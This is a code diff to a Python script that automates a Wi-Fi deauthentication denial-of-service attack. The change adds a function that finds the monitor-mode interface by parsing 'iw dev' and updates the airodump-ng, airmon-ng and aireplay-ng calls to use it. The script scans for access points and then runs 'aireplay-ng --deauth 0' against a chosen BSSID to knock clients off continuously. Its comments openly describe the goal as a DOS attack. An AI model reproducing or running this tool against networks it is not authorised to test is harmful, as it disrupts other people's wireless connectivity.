@@ -26,6 +26,49 @@ active_wireless_networks = []
 # If so we return False so we don't add it again.
 # If it is not in the lst we return True which will instruct the elif 
 # statement to add it to the lst.
+
+def get_monitor_interface(managed_iface):
+    """
+    Finds the corresponding monitor mode interface for a given managed interface.
+    The monitor interface can be wlanXmon, monX, or even remain as wlanX.
+
+    Args:
+        managed_iface (str): The name of the managed interface (e.g., wlan0, wlan1, wlan2).
+
+    Returns:
+        str or None: The matching monitor mode interface (e.g., wlan0mon, mon0, wlan0) or None if not found.
+    """
+    # Extract the number from the managed interface (e.g., wlan0 → 0, wlan2 → 2)
+    match = re.search(r"(\d+)$", managed_iface)
+    if not match:
+        print(f"Error: Could not extract number from {managed_iface}")
+        return None
+    
+    iface_number = match.group()  # Extracted number as a string
+
+    # Run 'iw dev' to get the list of interfaces and their modes
+    iw_result = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
+
+    # Look for interfaces in monitor mode
+    monitor_interfaces = {}
+    iface_name = None
+    monitor_mode = False
+
+    for line in iw_result.split("\n"):
+        line = line.strip()
+        if line.startswith("Interface "):  
+            iface_name = line.split()[1]  # Get the interface name
+            monitor_mode = False  # Reset monitor mode flag for the new interface
+        if "type monitor" in line and iface_name:
+            monitor_interfaces[iface_name] = True  # Store as monitor mode
+
+    # Match a monitor mode interface with the same number
+    for iface in monitor_interfaces.keys():
+        if re.search(rf"{iface_number}(mon)?$", iface):  # Match wlan0mon, mon0, or wlan0
+            return iface  
+
+    return None  # No matching monitor mode interface found
+
 def check_for_essid(essid, lst):
     check_status = True
 
@@ -129,7 +172,15 @@ put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
 # The output is an open file that can be accessed by other programs.
 # We run the iwconfig command to look for wireless interfaces.
 # Discover access points
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# Get the actual monitor mode name for the selected interface
+hacknic = get_monitor_interface(hacknic)
+
+if not hacknic:
+    print("No monitor mode interface found, exiting...")
+    exit()
+
+discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
 try:
@@ -189,13 +240,12 @@ hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
 # Change to the channel we want to perform the DOS attack on. 
 # Monitoring takes place on a different channel and we need to set it to that channel. 
-subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+subprocess.run(["airmon-ng", "start", hacknic, hackchannel])
 
 # Deauthenticate clients using a subprocess. 
 # The script is the parent process and creates a child process which runs the system command, 
 # and will only continue once the child process has completed.
-subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
+subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)]])
 
 # User will need to use control-c to break the script.
-
 
